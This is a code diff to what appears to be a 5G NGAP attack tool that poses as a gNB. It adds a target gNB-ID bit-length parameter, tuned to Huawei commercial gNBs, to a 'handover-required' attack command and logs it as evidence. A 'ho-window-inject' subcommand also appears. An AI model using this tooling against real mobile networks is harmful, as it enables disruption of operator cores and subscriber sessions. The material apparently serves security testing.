@@ -220,11 +220,16 @@ def cmd_path_switch(gnb, a):
 
 
 def cmd_handover_required(gnb, a):
+    tgt_len = int(getattr(a, "target_gnb_id_len", 22))
     r = gnb.send(B.handover_required(a.amf_ue_id, a.ran_ue_id, gnb.cfg,
-                                     target_gnb_id=a.target_gnb_id))
-    print(f"[handover-required] amf={a.amf_ue_id} target-gnb={a.target_gnb_id:#x} -> "
+                                     target_gnb_id=a.target_gnb_id,
+                                     target_gnb_id_len=tgt_len))
+    print(f"[handover-required] amf={a.amf_ue_id} "
+          f"target-gnb={a.target_gnb_id:#x}/{tgt_len}bit -> "
           f"{ngap.summarize(r) if r else '(no reply to us)'}")
     _save(a.evidence, {"attack": "handover-required", "amf_ue_id": a.amf_ue_id,
+                       "target_gnb_id": a.target_gnb_id,
+                       "target_gnb_id_len": tgt_len,
                        "result": ngap.message_type(r) if r else None})
 
 
@@ -901,6 +906,8 @@ def main():
     s.add_argument("--amf-ue-id", type=int, required=True)
     s.add_argument("--ran-ue-id", type=int, default=1)
     s.add_argument("--target-gnb-id", type=lambda x: int(x, 0), default=0)
+    s.add_argument("--target-gnb-id-len", type=int, default=22,
+                   help="TargetID gNB-ID bit length (Huawei commercial gNB is 22)")
 
     s = sub.add_parser("ho-window-inject")
     s.add_argument("--amf-ue-id", type=int, required=True,
